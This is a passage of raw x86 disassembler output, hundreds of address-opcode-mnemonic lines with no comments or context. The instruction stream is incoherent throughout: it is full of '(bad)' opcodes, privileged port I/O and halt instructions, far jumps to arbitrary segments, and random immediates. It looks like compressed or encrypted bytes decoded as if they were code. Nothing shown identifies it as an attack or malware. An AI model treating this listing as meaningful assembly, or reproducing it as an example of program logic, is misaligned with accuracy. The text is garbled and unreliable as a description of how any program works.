  41cfc7:	fiadd  DWORD PTR [edx]
  41cfc9:	into   
  41cfca:	xlat   BYTE PTR ds:[ebx]
  41cfcb:	push   esp
  41cfcc:	push   0xffffffe5
  41cfce:	lock fnstsw WORD PTR [esi-0x15]
  41cfd2:	cmp    bh,BYTE PTR [ebx+ebp*1]
  41cfd5:	sti    
  41cfd6:	push   ds
  41cfd7:	test   BYTE PTR [edx-0x45b71c16],al
  41cfdd:	inc    edx
  41cfde:	inc    eax
  41cfdf:	dec    esi
  41cfe0:	sub    al,0xc4
  41cfe2:	push   cs
  41cfe3:	loop   0x41cf7c
  41cfe5:	cmp    edi,edi
  41cfe7:	cmp    DWORD PTR [ebx+ebx*1+0x10],edx
  41cfeb:	xchg   esp,eax
  41cfec:	adc    eax,0x2a9bd212
  41cff1:	in     eax,dx
  41cff2:	mov    edx,0xebb15a07
  41cff7:	hlt    
  41cff8:	push   ecx
  41cff9:	dec    edi
  41cffa:	and    DWORD PTR [ecx+0xf7a131b],ebp
  41d000:	pusha  
  41d001:	jge    0x41cfea
  41d003:	out    dx,al
  41d004:	dec    esp
  41d005:	shl    DWORD PTR [edi+0xc],0x70
  41d009:	add    al,0xe5
  41d00b:	pop    esp
  41d00c:	es pop ebp
  41d00e:	xlat   BYTE PTR ds:[ebx]
  41d00f:	push   0xd2fbfbb7
  41d014:	mov    cl,0xda
  41d016:	les    edi,FWORD PTR [edi-0x7f]
  41d019:	dec    ebx
  41d01a:	or     ebp,ecx
  41d01c:	mov    edi,0xf71c7f3e
  41d021:	mov    dh,BYTE PTR ds:0x6f2b86bb
  41d027:	mov    eax,ds:0xb3fbd551
  41d02c:	cli    
  41d02d:	ret    0xdd2d
  41d030:	cli    
  41d031:	sbb    DWORD PTR [ebx+0x2ef06609],esi
  41d037:	mov    ah,0xa
  41d039:	cld    
  41d03a:	and    al,0xc6
  41d03c:	add    DWORD PTR [esi],0xffffff8d
  41d03f:	leave  
  41d040:	mov    WORD PTR [edi+0x6162be5e],cs
  41d046:	inc    esi
  41d047:	xor    eax,ebx
  41d049:	xchg   edi,eax
  41d04a:	push   0x39
  41d04c:	sbb    edx,DWORD PTR [ecx-0x7bef3409]
  41d052:	and    al,0xc7
  41d054:	in     al,0xe1
  41d056:	out    0x23,eax
  41d058:	out    dx,al
  41d059:	push   ss
  41d05a:	inc    esi
  41d05b:	arpl   WORD PTR [ecx],si
  41d05d:	popa   
  41d05e:	push   0xffffffa7
  41d060:	sahf   
  41d061:	cmp    eax,0xcd11812c
  41d066:	test   eax,0x33f36333
  41d06b:	xchg   bl,bl
  41d06d:	sbb    cl,al
  41d06f:	out    0xee,eax
  41d071:	(bad)  
  41d072:	loope  0x41d0ce
  41d074:	pop    edi
  41d075:	xor    al,0x4a
  41d077:	adc    al,0x9c
  41d079:	mul    BYTE PTR [edx+edx*1+0x2f]
  41d07d:	push   edi
  41d07e:	add    BYTE PTR [ebp+0x5d],ch
  41d081:	jg     0x41d078
  41d083:	retf   
  41d084:	loope  0x41d099
  41d086:	sub    BYTE PTR [eax-0x7e],al
  41d089:	inc    edx
  41d08a:	stc    
  41d08b:	cdq    
  41d08c:	adc    BYTE PTR [ebp+0x30],ch
  41d08f:	sub    BYTE PTR [ecx+0x7],bh
  41d092:	inc    esi
  41d093:	ret    
  41d094:	inc    esi
  41d095:	icebp  
  41d096:	push   ds
  41d097:	xor    ch,ah
  41d099:	mov    DWORD PTR [eax-0x2a2ad670],esi
  41d09f:	dec    esp
  41d0a0:	push   ds
  41d0a1:	(bad)  
  41d0a3:	mov    ds:0x838872ed,al
  41d0a8:	xlat   BYTE PTR ds:[ebx]
  41d0a9:	iret   
  41d0aa:	(bad)  
  41d0ab:	mov    esp,0x3ad1b21f
  41d0b0:	push   ds
  41d0b1:	sub    BYTE PTR [edi+eax*2+0x3a4586ae],dh
  41d0b8:	pop    ecx
  41d0b9:	pop    eax
  41d0ba:	add    al,0x73
  41d0bc:	cmp    BYTE PTR [edx-0x494d314b],cl
  41d0c2:	inc    esp
  41d0c3:	pusha  
  41d0c4:	mov    bl,0xc6
  41d0c6:	pop    ebx
  41d0c7:	out    0x47,al
  41d0c9:	inc    ebp
  41d0ca:	xchg   esi,eax
  41d0cb:	imul   ecx,ebx,0x99e299e
  41d0d1:	pop    ebp
  41d0d2:	jge    0x41d071
  41d0d4:	fcom   QWORD PTR ds:0xeb4211b8
  41d0da:	(bad)  
  41d0dc:	call   0xace4e7cc
  41d0e1:	dec    BYTE PTR [ebp+0x79960377]
  41d0e7:	out    0x57,al
  41d0e9:	in     al,0x34
  41d0eb:	fidivr DWORD PTR [esi+0x79aa14b8]
  41d0f1:	aas    
  41d0f2:	xor    BYTE PTR [ebp-0x31331389],0x2c
  41d0f9:	test   esp,0xff60e7b6
  41d0ff:	jno    0x41d155
  41d101:	std    
  41d102:	jno    0x41d120
  41d104:	js     0x41d124
  41d106:	out    0xe8,eax
  41d108:	sbb    DWORD PTR ds:0x1aa33150,0x7d
  41d10f:	or     BYTE PTR [ebx-0xa],al
  41d112:	add    al,0x3e
  41d114:	ror    BYTE PTR [eax-0x5ace9a0b],0xf6
  41d11b:	sub    eax,0xd1e639d0
  41d120:	imul   edx,edi,0xffffff9c
  41d123:	pop    ebp
  41d124:	mov    cl,0x36
  41d126:	wbinvd 
  41d128:	icebp  
  41d129:	fwait
  41d12a:	xchg   DWORD PTR [edx+0x45],ebx
  41d12d:	push   DWORD PTR [ebp+0xba18a8d]
  41d133:	outs   dx,DWORD PTR ds:[esi]
  41d134:	adc    al,0xab
  41d136:	jmp    0xb59df4ce
  41d13b:	add    DWORD PTR [eax+eax*8+0x5d],0x326c404
  41d143:	adc    BYTE PTR [edi],cl
  41d145:	sub    eax,0x61dc1d5
  41d14a:	stc    
  41d14b:	ja     0x41d1bc
  41d14d:	shl    eax,1
  41d14f:	push   0xffffffe7
  41d151:	and    eax,0x93516e0d
  41d156:	jnp    0x41d16b
  41d158:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d159:	(bad)
  41d15d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d15e:	pop    es
  41d15f:	ss stc 
  41d161:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  41d163:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d164:	or     cl,BYTE PTR fs:[ecx]
  41d167:	pop    ecx
  41d168:	xchg   ecx,eax
  41d169:	add    dl,BYTE PTR [ebp-0x4a]
  41d16c:	pop    ebp
  41d16d:	dec    eax
  41d16e:	int    0x22
  41d170:	lds    edi,FWORD PTR [ebx]
  41d172:	into   
  41d173:	inc    edi
  41d174:	sub    dl,bl
  41d176:	mov    eax,0x82e4f680
  41d17b:	and    ah,BYTE PTR [ebp-0x50a4e4bb]
  41d181:	pop    es
  41d182:	jge    0x41d144
  41d184:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d185:	xchg   BYTE PTR [eax-0x4639adc7],al
  41d18b:	jge    0x41d11e
  41d18d:	push   ecx
  41d18e:	sbb    al,0x77
  41d190:	jmp    0xee0d:0x2a472a12
  41d197:	inc    esi
  41d198:	xor    DWORD PTR [esi-0x78a9af9f],ecx
  41d19e:	call   eax
  41d1a0:	retf   0xdd3b
  41d1a3:	jno    0x41d138
  41d1a5:	fcom   QWORD PTR [ebp+0x60]
  41d1a8:	pop    edx
  41d1a9:	push   ebx
  41d1aa:	mov    bh,0x86
  41d1ac:	shr    DWORD PTR [esi-0x36df4bab],1
  41d1b2:	jmp    0x9d105354
  41d1b7:	add    eax,0x8d9480d1
  41d1bc:	aaa    
  41d1bd:	not    ah
  41d1bf:	pop    ebp
  41d1c0:	add    eax,0xaafce18b
  41d1c5:	packsswb mm7,QWORD PTR [edx-0x661585aa]
  41d1cc:	push   ecx
  41d1cd:	scas   al,BYTE PTR es:[edi]
  41d1ce:	sub    ebx,edx
  41d1d0:	xchg   edi,eax
  41d1d1:	sbb    DWORD PTR [esi-0x561b3bb6],0xcfd50e00
  41d1db:	mov    cl,bl
  41d1dd:	shr    BYTE PTR [edi+0x3d0ad299],1
  41d1e3:	cmp    al,0x32
  41d1e5:	xor    eax,0xf8ee8ca3
  41d1ea:	xchg   ebx,eax
  41d1eb:	call   0x7a4b:0xc3a9cb91
  41d1f2:	shl    BYTE PTR [edx],1
  41d1f4:	aad    0xcc
  41d1f6:	aad    0x9
  41d1f8:	mov    dl,0x8c
  41d1fa:	aaa    
  41d1fb:	push   esi
  41d1fc:	lea    ecx,[edx]
  41d1fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d1ff:	add    dl,BYTE PTR [eax+0x4c]
  41d202:	fld    QWORD PTR [ebx+0x7f]
  41d205:	or     DWORD PTR [edi],edi
  41d207:	rcr    BYTE PTR [edi-0x4],0x34
  41d20b:	xor    eax,0x468fcaf4
  41d210:	mov    ebp,0xba589c1c
  41d215:	enter  0x870e,0x36
  41d219:	push   ecx
  41d21a:	mov    ecx,0x9b0dda6a
  41d21f:	mov    eax,ds:0x2d66bcde
  41d224:	stc    
  41d225:	xor    edx,DWORD PTR [edi]
  41d227:	sbb    DWORD PTR [edx-0x7c061a96],ebx
  41d22d:	mov    DWORD PTR [edx-0x4a0dc7ac],eax
  41d233:	ins    DWORD PTR es:[edi],dx
  41d234:	(bad)  
  41d235:	xlat   BYTE PTR ds:[ebx]
  41d236:	leave  
  41d237:	cmp    dh,BYTE PTR [esi+ecx*1-0xdc22a9a]
  41d23e:	xchg   DWORD PTR ds:0xa6e2199c,eax
  41d244:	jge    0x41d1e4
  41d246:	fdivr  QWORD PTR [ebx+0x7d]
  41d249:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d24a:	sar    BYTE PTR [edi-0x4c],0x4f
  41d24e:	in     eax,dx
  41d24f:	shl    DWORD PTR [ecx-0x364eac6c],0x94
  41d256:	mov    al,dh
  41d258:	iret   
  41d259:	or     eax,DWORD PTR [ebx]
  41d25b:	js     0x41d27d
  41d25d:	es aas 
  41d25f:	jle    0x41d2c4
  41d261:	xor    ebp,DWORD PTR [esi]
  41d263:	aam    0x56
  41d265:	cld    
  41d266:	in     eax,dx
  41d267:	inc    edx
  41d268:	inc    esp
  41d269:	sbb    edi,ebx
  41d26b:	cli    
  41d26c:	outs   dx,DWORD PTR ds:[esi]
  41d26d:	mov    ah,0x74
  41d26f:	cmp    eax,0x3f99802
  41d274:	in     al,dx
  41d275:	lahf   
  41d276:	pusha  
  41d277:	jns    0x41d232
  41d279:	arpl   WORD PTR [eax],ax
  41d27b:	xor    DWORD PTR [esi+0x1837bd19],ecx
  41d281:	and    al,0xd2
  41d283:	ja     0x41d302
  41d285:	fadd   DWORD PTR [esi]
  41d287:	gs test eax,0xf4894112
  41d28d:	jecxz  0x41d2bc
  41d28f:	mov    ebx,0x52a3e397
  41d294:	sub    al,0x60
  41d296:	popf   
  41d297:	pop    ds
  41d298:	pop    ecx
  41d299:	test   al,0x92
  41d29b:	inc    esi
  41d29c:	fs stos BYTE PTR es:[edi],al
  41d29e:	ror    bh,0x6
  41d2a1:	dec    edi
  41d2a2:	jno    0x41d28f
  41d2a4:	call   0x926832b9
  41d2a9:	push   esp
  41d2aa:	fistp  WORD PTR [ebx]
  41d2ac:	mov    edx,0x2f56a95f
  41d2b1:	sub    BYTE PTR [ecx+0x4c],0xff
  41d2b5:	jae    0x41d2e5
  41d2b7:	retf   0x92a1
  41d2ba:	and    bl,ah
  41d2bc:	or     ecx,DWORD PTR [esi+edi*2-0x2e]
  41d2c0:	sbb    esi,DWORD PTR [edi-0x2eb300a0]
  41d2c6:	scas   eax,DWORD PTR es:[edi]
  41d2c7:	jg     0x41d325
  41d2c9:	xor    eax,0x3210ad2
  41d2ce:	add    eax,0x8eeda66b
  41d2d3:	mov    WORD PTR [edi-0x66],?
  41d2d6:	jecxz  0x41d33c
  41d2d8:	sub    BYTE PTR [ebp+0xf6e5b15],bh
  41d2de:	cmc    
  41d2df:	fwait
  41d2e0:	push   0xffffffcf
  41d2e2:	clc    
  41d2e3:	dec    edi
  41d2e4:	cmp    DWORD PTR [ebx+0x715ab36],esp
  41d2ea:	into   
  41d2eb:	jge    0x41d280
  41d2ed:	or     eax,0x633e4e4c
  41d2f2:	in     al,0x6f
  41d2f4:	sub    BYTE PTR [edx+ebx*1],al
  41d2f7:	ret    0x3d6d
  41d2fa:	jecxz  0x41d2f6
  41d2fc:	lock aad 0xec
  41d2ff:	push   ds
  41d300:	xor    edx,DWORD PTR [ebx-0x6]
  41d303:	outs   dx,DWORD PTR ds:[esi]
  41d304:	jne    0x41d2ab
  41d306:	jp     0x41d2c1
  41d308:	xchg   ebp,eax
  41d309:	add    DWORD PTR [ecx],ecx
  41d30b:	test   BYTE PTR [ecx],cl
  41d30d:	xor    eax,0x7f640286
  41d312:	mov    dl,ah
  41d314:	cmp    edi,DWORD PTR [ebx+0x4c]
  41d317:	pop    edx
  41d318:	xchg   DWORD PTR [edx+eiz*1],edx
  41d31b:	inc    ebp
  41d31c:	or     dl,BYTE PTR ds:0x1de17229
  41d322:	arpl   WORD PTR [ebp+0x3d113698],bp
  41d328:	cmp    al,0x4b
  41d32a:	mov    DWORD PTR [edx+0x7b],edx
  41d32d:	into   
  41d32e:	mov    ch,BYTE PTR [ebx]
  41d330:	repz test BYTE PTR [esp+esi*8-0xee1ef5b],cl
  41d338:	mov    WORD PTR [esi-0x6c],ss
  41d33b:	pop    edx
  41d33c:	xchg   BYTE PTR [esi],dh
  41d33e:	sub    eax,0xf91bb88e
  41d343:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d344:	cwde   
  41d345:	je     0x41d313
  41d347:	(bad)  
  41d348:	mov    edx,0xa7be2f28
  41d34d:	aam    0x97
  41d34f:	jecxz  0x41d2e7
  41d351:	stos   BYTE PTR es:[edi],al
  41d352:	(bad)  
  41d353:	pop    eax
  41d354:	enter  0x2733,0x5b
  41d358:	(bad)  
  41d35a:	shr    DWORD PTR [edx-0x2209469],1
  41d360:	sbb    ecx,DWORD PTR [ecx-0x56c185b8]
  41d366:	pop    es
  41d367:	jecxz  0x41d3a1
  41d369:	loope  0x41d37a
  41d36b:	lock add al,BYTE PTR [ebx-0xe]
  41d36f:	mov    ebp,DWORD PTR [ecx]
  41d371:	push   eax
  41d372:	add    al,0x26
  41d374:	ins    DWORD PTR es:[edi],dx
  41d375:	xchg   ebp,eax
  41d376:	aas    
  41d377:	fwait
  41d378:	mov    ch,0xe2
  41d37a:	mov    cs,WORD PTR [ecx+0x3d190713]
  41d380:	add    DWORD PTR [ebp-0x368688a6],edx
  41d386:	std    
  41d387:	jbe    0x41d395
  41d389:	lods   al,BYTE PTR ds:[esi]
  41d38a:	aad    0xb5
  41d38c:	imul   esp,DWORD PTR [ebp-0x44],0xffffffa9
  41d390:	jmp    0x5545:0xa096
  41d396:	bound  ecx,QWORD PTR [ebx+0x9f16439]
  41d39c:	mov    eax,0x8d917c44
  41d3a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d3a2:	ins    DWORD PTR es:[edi],dx
  41d3a3:	fmul   QWORD PTR [ecx]
  41d3a5:	pop    ebp
  41d3a6:	js     0x41d403
  41d3a8:	jg     0x41d364
  41d3aa:	push   ebp
  41d3ab:	outs   dx,BYTE PTR ds:[esi]
  41d3ac:	ss rol edi,cl
  41d3af:	sbb    al,0x7e
  41d3b1:	and    BYTE PTR [edx],bh
  41d3b3:	stos   BYTE PTR es:[edi],al
  41d3b4:	inc    ebp
  41d3b5:	into   
  41d3b6:	dec    edx
  41d3b7:	mov    DWORD PTR [esi],edx
  41d3b9:	dec    edx
  41d3ba:	sub    dh,BYTE PTR [ebx+0x656eafe4]
  41d3c0:	clc    
  41d3c1:	(bad)  
  41d3c2:	adc    bh,BYTE PTR [edi-0x34334d4]
  41d3c8:	test   al,0x94
  41d3ca:	loopne 0x41d3ce
  41d3cc:	aas    
  41d3cd:	or     DWORD PTR [edx-0x796455d0],edi
  41d3d3:	ret    
  41d3d4:	fldenv [edi+0x15c7c223]
  41d3da:	call   0xefc6:0x8452d085
  41d3e1:	push   cs
  41d3e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d3e3:	fidiv  DWORD PTR [ecx-0x6ad0d40b]
  41d3e9:	arpl   bp,ax
  41d3eb:	loopne 0x41d46b
  41d3ed:	pushf  
  41d3ee:	dec    edi
  41d3ef:	push   esp
  41d3f0:	mov    cl,0xac
  41d3f2:	test   eax,0x5d4a2af
  41d3f7:	mov    al,0x8
  41d3f9:	sub    al,0xb3
  41d3fb:	sbb    al,0xee
  41d3fd:	test   al,0x53
  41d3ff:	xchg   esi,eax
  41d400:	mov    ds:0xbcda97e3,eax
  41d405:	mov    ds:0x25cf68cc,al
  41d40a:	mov    edx,0xd576fff7
  41d40f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d410:	mov    eax,0xc4cc9ca7
  41d415:	sbb    eax,0xb6c7862f
  41d41a:	cmp    esi,DWORD PTR [ecx]
  41d41c:	mov    es,WORD PTR [edx+edx*2-0x24f6eabc]
  41d423:	ins    DWORD PTR es:[edi],dx
  41d424:	xor    al,dl
  41d426:	push   0x50302f64
  41d42b:	rcl    ebx,1
  41d42d:	out    dx,eax
  41d42e:	xchg   BYTE PTR [ecx],al
  41d430:	fisubr WORD PTR [edx-0x7c1224c7]
  41d436:	pop    ebp
  41d437:	ins    DWORD PTR es:[edi],dx
  41d438:	mov    WORD PTR [ebp+0x299fe60b],es
  41d43e:	retf   
  41d43f:	adc    bh,al
  41d441:	mov    dh,0xf6
  41d443:	inc    ebp
  41d444:	xchg   DWORD PTR [esi+0x6f],esp
  41d447:	dec    edx
  41d448:	ja     0x41d3df
  41d44a:	test   eax,0x9aab3293
  41d44f:	ficomp WORD PTR [esi+0x62352769]
  41d455:	mov    ah,0x45
  41d457:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d458:	fsubr  DWORD PTR [ebx]
  41d45a:	cmp    eax,DWORD PTR [esp+eiz*4-0x13]
  41d45e:	adc    ah,BYTE PTR [ecx+0x2a9a57a2]
  41d464:	loope  0x41d48c
  41d466:	inc    ebx
  41d467:	mov    cl,0xa7
  41d469:	and    dh,BYTE PTR [ecx-0x728464a5]
  41d46f:	pop    ds
  41d470:	pop    ds
  41d471:	and    ebp,DWORD PTR [ebx-0x1c]
  41d474:	inc    esp
  41d475:	mov    DWORD PTR [ebp-0x139f55e],ebx
  41d47b:	pop    ds
  41d47c:	retf   
  41d47d:	pop    edx
  41d47e:	loop   0x41d48c
  41d480:	or     DWORD PTR [ebx+eiz*2],ecx
  41d483:	stc    
  41d484:	jo     0x41d445
  41d486:	lahf   
  41d487:	push   ebx
  41d488:	push   es
  41d489:	sbb    dh,BYTE PTR [bx+si]
  41d48c:	cmp    dl,BYTE PTR [ebp-0x77e6e65f]
  41d492:	fdiv   DWORD PTR [ecx]
  41d494:	push   esp
  41d495:	push   edx
  41d496:	pop    ds
  41d497:	shl    DWORD PTR [ecx+ebp*1],cl
  41d49a:	mov    bh,0x28
  41d49c:	arpl   WORD PTR [ebx-0x4],dx
  41d49f:	fidivr WORD PTR [ecx]
  41d4a1:	ds pop ds
  41d4a3:	popf   
  41d4a4:	add    al,0xf3
  41d4a6:	fistp  WORD PTR [ecx+0x4a]
  41d4a9:	hlt    
  41d4aa:	push   esp
  41d4ab:	mov    ebx,0x521fe387
  41d4b0:	cwde   
  41d4b1:	neg    DWORD PTR [esp+edx*8]
  41d4b4:	cwde   
  41d4b5:	test   eax,esp
  41d4b7:	xor    al,0xe
  41d4b9:	pop    eax
  41d4ba:	lods   eax,DWORD PTR ds:[esi]
  41d4bb:	and    BYTE PTR [ebx+0x7b208516],cl
  41d4c1:	xchg   ecx,eax
  41d4c2:	cmp    eax,0xfdd605f2
  41d4c7:	or     DWORD PTR [ecx+0x4712bf9],0xfffffff5
  41d4ce:	xchg   edi,eax
  41d4cf:	ss loope 0x41d543
  41d4d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d4d3:	dec    esp
  41d4d4:	inc    edx
  41d4d5:	and    ecx,esi
  41d4d7:	pop    ds
  41d4d8:	sub    dh,dl
  41d4da:	out    dx,eax
  41d4db:	adc    BYTE PTR [ebx],ch
  41d4dd:	in     al,0xf5
  41d4df:	jmp    0x41d514
  41d4e1:	xor    eax,esi
  41d4e3:	loop   0x41d491
  41d4e5:	pusha  
  41d4e6:	leave  
  41d4e7:	loop   0x41d4b5
  41d4e9:	push   ecx
  41d4ea:	aaa    
  41d4eb:	daa    
  41d4ec:	les    edi,FWORD PTR [eax]
  41d4ee:	cld    
  41d4ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d4f0:	adc    BYTE PTR ds:0x51c50048,bl
  41d4f6:	xchg   ecx,eax
  41d4f7:	es mov esi,0xfe9926f0
  41d4fd:	inc    eax
  41d4fe:	sar    DWORD PTR [edi],1
  41d500:	xchg   edx,eax
  41d501:	inc    eax
  41d502:	prefetch (bad)
  41d503:	or     eax,0xcaadffef
  41d508:	sbb    BYTE PTR ds:0xa11a3724,dh
  41d50e:	mov    ecx,0x5529fc2
  41d513:	fidiv  DWORD PTR [ebp+0xf]
  41d516:	mov    ds:0x304939d3,eax
  41d51b:	cwde   
  41d51c:	and    al,BYTE PTR [ecx-0x21048925]
  41d522:	add    BYTE PTR [ebx],cl
  41d524:	outs   dx,DWORD PTR ds:[esi]
  41d525:	jo     0x41d50e
  41d527:	inc    esp
  41d528:	hlt    
  41d529:	mov    dh,0x1d
  41d52b:	shl    edx,1
  41d52d:	hlt    
  41d52e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d52f:	ret    0xc59a
  41d532:	jns    0x41d519
  41d534:	arpl   WORD PTR [ecx-0x6c],bp
  41d537:	sbb    edi,DWORD PTR [ebx+0x4b86fd14]
  41d53d:	mov    ebx,0xbe9014
  41d542:	inc    eax
  41d543:	std    
  41d544:	or     BYTE PTR [edi+0x9457236],bl
  41d54a:	push   cs
  41d54b:	div    BYTE PTR [ecx+0x57]
  41d54e:	and    eax,0x191bbd57
  41d553:	xchg   ebx,eax
  41d554:	dec    esi
  41d555:	sahf   
  41d556:	lea    ebp,[esi+edx*8-0x4da50b90]
  41d55d:	retf   0xc4ea
  41d560:	xor    dl,bh
  41d562:	jb     0x41d548
  41d564:	cmp    eax,0x4544f028
  41d569:	jmp    0x114b:0xd27f9033
  41d570:	in     al,dx
  41d571:	(bad)  
  41d572:	ss rcl edi,1
  41d575:	mov    edx,0x56fa9b18
  41d57a:	mov    ah,0x60
  41d57c:	sub    BYTE PTR [ebx-0x7d],dl
  41d57f:	xor    BYTE PTR [edx],ch
  41d581:	out    0x58,al
  41d583:	jae    0x41d55e
  41d585:	ins    BYTE PTR es:[edi],dx
  41d586:	cmp    DWORD PTR [esi-0x65a10ca9],esp
  41d58c:	xor    al,0x22
  41d58e:	pop    ebp
  41d58f:	stos   BYTE PTR es:[edi],al
  41d590:	imul   esi,edi,0x32
  41d593:	push   edx
  41d594:	rcl    DWORD PTR [ebx-0x3],0xb9
  41d598:	out    dx,al
  41d599:	push   eax
  41d59a:	cs rcl edi,0x77
  41d59e:	pushf  
  41d59f:	clc    
  41d5a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d5a1:	pop    edi
  41d5a2:	rcl    BYTE PTR [ebp+0x42],cl
  41d5a5:	add    ch,0x74
  41d5a8:	xor    ebx,DWORD PTR [ebx-0x40]
  41d5ab:	mov    BYTE PTR [eax],dl
  41d5ad:	push   cx
  41d5af:	rcl    ebp,0xb8
  41d5b2:	hlt    
  41d5b3:	and    dl,al
  41d5b5:	adc    BYTE PTR [ebx],dh
  41d5b7:	lods   al,BYTE PTR ds:[esi]
  41d5b8:	mov    ds:0xc56ea461,eax
  41d5bd:	and    eax,0xb178ce93
  41d5c2:	mov    BYTE PTR [ebp+0x21f4236],0xe3
  41d5c9:	cmp    al,al
  41d5cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d5cc:	outs   dx,BYTE PTR ds:[esi]
  41d5cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d5ce:	xor    ah,bl
  41d5d0:	xchg   ebx,eax
  41d5d1:	mov    esi,DWORD PTR [edi+ebx*4+0x271e481a]
  41d5d8:	loop   0x41d5cb
  41d5da:	push   esi
  41d5db:	rcl    DWORD PTR [eax],1
  41d5dd:	mov    DWORD PTR [edi],ebp
  41d5df:	mov    eax,ds:0x6621b460
  41d5e4:	repz xor DWORD PTR [edx],eax
  41d5e7:	mov    DWORD PTR [esi],esp
  41d5e9:	outs   dx,BYTE PTR ds:[esi]
  41d5ea:	xor    ecx,DWORD PTR [esi+0x479c89dc]
  41d5f0:	ss pop ss
  41d5f2:	push   ss
  41d5f3:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  41d5f5:	inc    esp
  41d5f6:	ins    BYTE PTR es:[edi],dx
  41d5f7:	outs   dx,DWORD PTR ds:[esi]
  41d5f8:	push   0xce9ec90f
  41d5fd:	loop   0x41d584
  41d5ff:	out    0xda,eax
  41d601:	in     al,0x59
  41d603:	push   ebp
  41d604:	iret   
  41d605:	int    0x17
  41d607:	jbe    0x41d5fa
  41d609:	ins    DWORD PTR es:[edi],dx
  41d60a:	ja     0x41d5fc
  41d60c:	(bad)  
  41d60d:	retf   
  41d60e:	aas    
  41d60f:	inc    esi
  41d610:	mov    dh,BYTE PTR [edi+0x67c81f78]
  41d616:	mov    esp,0x338a49da
  41d61b:	ficomp DWORD PTR [edx+0x262ecb08]
  41d621:	sbb    ecx,eax
  41d623:	mov    ebx,0x7765817e
  41d628:	xlat   BYTE PTR ds:[ebx]
  41d629:	or     esi,esp
  41d62b:	in     eax,0x60
  41d62d:	mov    cl,0x2a
  41d62f:	std    
  41d630:	xchg   DWORD PTR [eax+0x50362ae],edi
  41d636:	arpl   dx,sp
  41d638:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d639:	clc    
  41d63a:	mov    eax,0x29530d0e
  41d63f:	dec    ebx
  41d640:	and    eax,0x21f77d76
  41d645:	pop    esi
  41d646:	jns    0x41d663
  41d648:	inc    esi
  41d649:	inc    eax
  41d64a:	je     0x41d603
  41d64c:	lods   eax,DWORD PTR ds:[esi]
  41d64d:	pop    es
  41d64e:	mov    ds,WORD PTR [edi-0x45]
  41d651:	or     ebx,edx
  41d653:	cdq    
  41d654:	cmp    al,0x1d
  41d656:	(bad)  
  41d657:	push   0xc0da6f61
  41d65c:	inc    ebx
  41d65d:	call   0x8c8d:0x8200ad80
  41d664:	mov    dl,0x29
  41d666:	in     eax,0x95
  41d668:	sub    eax,0x6834c313
  41d66d:	cli    
  41d66e:	imul   edi,edi,0x25
  41d671:	not    BYTE PTR [esi-0x1e]
  41d674:	pushf  
  41d675:	(bad)  
  41d676:	push   esi
  41d677:	ins    BYTE PTR es:[edi],dx
  41d678:	pop    ds
  41d679:	js     0x41d621
  41d67b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d67c:	pop    esp
  41d67d:	enter  0x5578,0x79
  41d681:	icebp  
  41d682:	rol    DWORD PTR [ebx+0x169e7f6d],1
  41d688:	push   ds
  41d689:	(bad)  
  41d68a:	(bad)  
  41d68b:	fmul   QWORD PTR [ecx+0x18af11f1]
  41d691:	aas    
  41d692:	clc    
  41d693:	sahf   
  41d694:	jmp    0x150bb93a
  41d699:	mov    eax,ds:0x73d92178
  41d69e:	add    DWORD PTR [eax-0x24a07ac7],ecx
  41d6a4:	mov    esi,0x8c039d76
  41d6a9:	ins    BYTE PTR es:[edi],dx
  41d6aa:	jno    0x41d64e
  41d6ac:	out    dx,al
  41d6ad:	(bad)  fs:[eax-0x7bf4b545]
  41d6b4:	in     al,0x96
  41d6b6:	cmp    eax,0x578ea792
  41d6bb:	and    BYTE PTR [ecx+0x27],cl
  41d6be:	daa    
  41d6bf:	push   cs
  41d6c0:	inc    edx
  41d6c1:	mov    dl,0x1d
  41d6c3:	iret   
  41d6c4:	pushf  
  41d6c5:	test   edi,esp
  41d6c7:	cmp    bh,ah
  41d6c9:	pop    ebp
  41d6ca:	inc    edi
  41d6cb:	sbb    DWORD PTR [edi-0x30130c9c],ebx
  41d6d1:	out    dx,al
  41d6d2:	pop    esp
  41d6d3:	repz and ecx,DWORD PTR cs:0x173aeebc
  41d6db:	inc    ebp
  41d6dc:	push   ss
  41d6dd:	and    esp,DWORD PTR [edi+0x27191e85]
  41d6e3:	inc    esi
  41d6e4:	jecxz  0x41d679
  41d6e6:	repz sbb eax,0xaced1ea3
  41d6ec:	lods   al,BYTE PTR ds:[esi]
  41d6ed:	pop    ds
  41d6ee:	cmp    ebp,DWORD PTR [ecx]
  41d6f0:	aas    
  41d6f1:	(bad)  
  41d6f2:	jo     0x41d6ae
  41d6f4:	xchg   ebx,eax
  41d6f5:	or     ebx,edi
  41d6f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d6f8:	xchg   ebx,eax
  41d6f9:	dec    esp
  41d6fa:	mov    ds:0xe42b2029,eax
  41d6ff:	bound  edi,QWORD PTR ds:0x40fb80c8
  41d705:	adc    edi,DWORD PTR [esi]
  41d707:	out    dx,al
  41d708:	sub    eax,DWORD PTR [edi]
  41d70a:	loopne 0x41d6c1
  41d70c:	jae    0x41d76f
  41d70e:	mov    bh,bh
  41d710:	push   edx
  41d711:	sub    ch,dl
  41d713:	xchg   ecx,eax
  41d714:	lds    edi,FWORD PTR [edi-0x2b9e4cf7]
  41d71a:	adc    eax,0xb8304ec3
